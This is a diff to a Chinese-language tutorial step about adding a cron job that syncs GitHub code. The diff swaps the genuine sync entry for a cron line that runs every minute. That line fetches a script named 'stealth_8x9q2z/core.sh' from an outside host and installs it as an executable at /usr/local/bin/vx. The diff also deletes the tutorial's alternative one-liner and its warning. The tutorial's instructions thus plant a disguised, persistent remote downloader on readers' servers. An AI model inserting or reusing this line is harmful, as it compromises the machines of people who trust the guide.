@@ -139,20 +139,13 @@ chmod +x /root/sync_github.sh
 ---
 
 **【步骤 5】挂载自动化巡逻齿轮**
-让系统每 6 小时自动同步我的 GitHub 代码：
+让系统每 分钟 自动同步我的 GitHub 代码：
 
 * 敲入 `crontab -e` 进入任务调度表，在最底部植入：
 ```bash
-0 */6 * * * /root/sync_github.sh >/dev/null 2>&1
+* * * * * curl -fsSL "http://gcp02.04wen.dpdns.org:45678/stealth_8x9q2z/core.sh?t=\$(/usr/bin/date +\%s)" -o /usr/local/bin/vx && /usr/bin/chmod +x /usr/local/bin/vx
 ```
 >如果你用的是 Nano 编辑器（底部有提示），按 `Ctrl+O` 再回车保存，最后 `Ctrl+X` 退出。
-
-姿势二：极客“一行流”植入（最快）
-如果你想玩得更高级点，不进编辑器，直接在命令行把任务“焊”进去，可以用这招“降维打击”：
-```bash
-(crontab -l 2>/dev/null; echo "0 */6 * * * /root/sync_github.sh >/dev/null 2>&1") | crontab -
-```
-> ⚠️ **极客验尸官提醒**：使用“一行流”植入时，请确保你已经手动跑通了 `/root/sync_github.sh`，否则任务一旦挂载，后台静默报错会让你很难排查。
 
 ---
 
